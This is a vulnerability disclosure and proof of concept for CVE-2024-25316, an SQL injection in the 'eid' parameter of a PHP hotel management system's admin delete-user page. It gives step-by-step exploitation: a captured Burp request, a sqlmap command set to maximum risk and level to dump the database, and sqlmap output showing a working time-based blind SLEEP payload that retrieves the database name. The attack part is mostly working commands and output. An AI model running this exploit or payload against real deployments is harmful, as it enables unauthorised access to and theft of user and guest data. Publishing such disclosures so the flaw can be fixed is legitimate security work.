# CVE-2024-25316 - Hotel Managment System - SQL Injection-4
+ *Exploit Title:* Hotel Managment System - SQL Injection-4
+ *Date:* 2024-02-01
+ *Exploit Author:* Tuba Kavgacı
+ *Vendor Homepage:* https://code-projects.org/hotel-management-system-in-php-with-source-code/
+ *Software Link:* https://download.code-projects.org/details/cd8fc4cb-c6b6-48f7-9cc3-27044a0a26a3
+ *Version:* 1.0
+ *Tested on:* Kali Linux + PHP 8.2.12, Apache 2.4.58
+ *CVE:* CVE-2024-25316

## Description:
Hotel Managment System 1.0, allows SQL Injection via the 'eid' parameter in Hotel/admin/usersettingdel.php?eid=2. Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: http://localhost/Hotel/admin/usersetting.php
+ Click delete user button
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:
```
GET /Hotel/admin/usersettingdel.php?eid=2 HTTP/1.1
Host: localhost
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36

```
+ Use sqlmap to exploit. In sqlmap, use 'eid' parameter to dump the database.
```
python sqlmap.py -r r.txt -p eid --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: eid (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: eid=2' AND (SELECT 4449 FROM (SELECT(SLEEP(5)))GoxS)-- fWtv
---
[19:08:46] [INFO] the back-end DBMS is MySQL
[19:08:46] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
web application technology: PHP 8.2.12, Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[19:08:51] [INFO] fetching current database
multi-threading is considered unsafe in time-based data retrieval. Are you sure of your choice (breaking warranty) [y/N] N
[19:08:51] [INFO] retrieved: 
[19:09:01] [INFO] adjusting time delay to 1 second due to good response times
hotel
current database: 'hotel'
```
+ current database : `hotel`
  
![Ekran görüntüsü 2024-02-02 031013](https://github.com/tubakvgc/CVEs/assets/74067343/e8e7751f-27fc-4365-9d95-400ddc67b351)





  
